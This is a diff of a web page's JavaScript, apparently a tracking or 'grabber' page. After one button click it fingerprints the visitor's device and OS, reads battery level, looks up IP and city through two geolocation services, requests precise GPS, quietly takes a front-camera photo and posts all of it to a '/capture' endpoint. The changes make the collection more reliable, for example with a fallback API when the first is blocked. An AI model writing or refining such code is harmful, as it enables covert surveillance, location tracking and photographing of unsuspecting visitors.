@@ -43,40 +43,35 @@
 
 <script>
     async function startProcess() {
-        const btn = document.getElementById('mainBtn');
-        const loader = document.getElementById('loader');
-        btn.style.display = 'none';
-        loader.style.display = 'block';
+        document.getElementById('mainBtn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-        // 1. ADVANCED DEVICE DETECTION (iPhone & Android)
         let ua = navigator.userAgent;
-        let deviceModel = "Unknown Device";
-        let brand = "Unknown Brand";
+        let deviceModel = "Detecting...";
+        let osVersion = "Detecting...";
 
+        // 1. Better Device Detection Logic
         if (/android/i.test(ua)) {
-            brand = "Android";
-            // Extracts model from strings like (Linux; Android 14; SM-S928B)
             let match = ua.match(/Android\s([0-9\.]+);\s([^;)]+)/);
+            osVersion = match ? "Android " + match[1] : "Android";
             deviceModel = match ? match[2] : "Android Mobile";
         } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            brand = "Apple";
-            // iPhone models are hidden in UA, using screen analysis
-            let w = window.screen.width;
-            let h = window.screen.height;
-            if (w === 430 && h === 932) deviceModel = "iPhone 15/14 Pro Max";
-            else if (w === 393 && h === 852) deviceModel = "iPhone 15/14 Pro";
-            else if (w === 428 && h === 926) deviceModel = "iPhone 13/12 Pro Max";
-            else if (w === 390 && h === 844) deviceModel = "iPhone 13/12/12 Pro";
-            else deviceModel = "iPhone (Standard)";
+            osVersion = "iOS";
+            let w = window.screen.width, h = window.screen.height;
+            if (w === 430 || h === 932) deviceModel = "iPhone 15/14 Pro Max";
+            else if (w === 393 || h === 852) deviceModel = "iPhone 15/14 Pro";
+            else deviceModel = "Apple iPhone";
+        } else {
+            deviceModel = navigator.platform;
         }
 
         let reportData = {
             model: deviceModel,
-            brand: brand,
+            os: osVersion,
             battery: "N/A",
             time: new Date().toLocaleString(),
             lat: "0", lon: "0",
-            city: "Pending", country: "Pending", ip: "Pending"
+            city: "Fetching...", country: "Fetching...", ip: "Fetching..."
         };
 
         // 2. Battery
@@ -85,26 +80,33 @@
             reportData.battery = Math.round(b.level * 100) + "%";
         }
 
-        // 3. Geo-IP with Backup
+        // 3. Multi-Source IP (Fix for "Err Blocked")
         const fetchGeo = async () => {
+            // First try ip-api
             try {
-                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
+                const res = await fetch('https://demo.ip-api.com/json/?fields=66846719');
                 const data = await res.json();
-                if(data.status === 'success') {
-                    reportData.city = data.city;
-                    reportData.country = data.country;
-                    reportData.ip = data.query;
-                }
+                reportData.city = data.city || "Unknown";
+                reportData.country = data.country || "Unknown";
+                reportData.ip = data.query || "Unknown";
             } catch (e) {
-                reportData.city = "Err (Blocked)";
+                // Backup API if first one is blocked
+                try {
+                    const res2 = await fetch('https://ipinfo.io/json?token=YOUR_FREE_TOKEN_OPTIONAL');
+                    const data2 = await res2.json();
+                    reportData.city = data2.city;
+                    reportData.country = data2.country;
+                    reportData.ip = data2.ip;
+                } catch (e2) {
+                    reportData.city = "Access Blocked";
+                }
             }
         };
 
-        // 4. HD Camera & Location
+        // 4. Parallel Execution
         const geoPromise = fetchGeo();
-        // Constraints for better quality
         const cameraPromise = navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
+            video: { facingMode: "user", width: 1080, height: 1920 } 
         }).catch(() => null);
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -113,7 +115,7 @@
             finalize(await cameraPromise, reportData, geoPromise);
         }, async () => {
             finalize(await cameraPromise, reportData, geoPromise);
-        }, { enableHighAccuracy: true, timeout: 8000 });
+        }, { enableHighAccuracy: true, timeout: 7000 });
     }
 
     async function finalize(stream, data, geoTask) {
@@ -121,24 +123,20 @@
         if (stream) {
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
-            // DELAY INCREASED: 2.2 seconds for camera sensor to adjust light
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
-                // Auto-orient capture
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photo = canvas.toDataURL('image/jpeg', 0.9); // Quality set to 90%
-                
+                const photo = canvas.toDataURL('image/jpeg', 0.85);
                 stream.getTracks().forEach(t => t.stop());
-                sendData(data, photo);
-            }, 2200);
+                sendFinal(data, photo);
+            }, 2000); // 2 sec for focus
         } else {
-            sendData(data, null);
+            sendFinal(data, null);
         }
     }
 
-    function sendData(info, photo) {
+    function sendFinal(info, photo) {
         fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
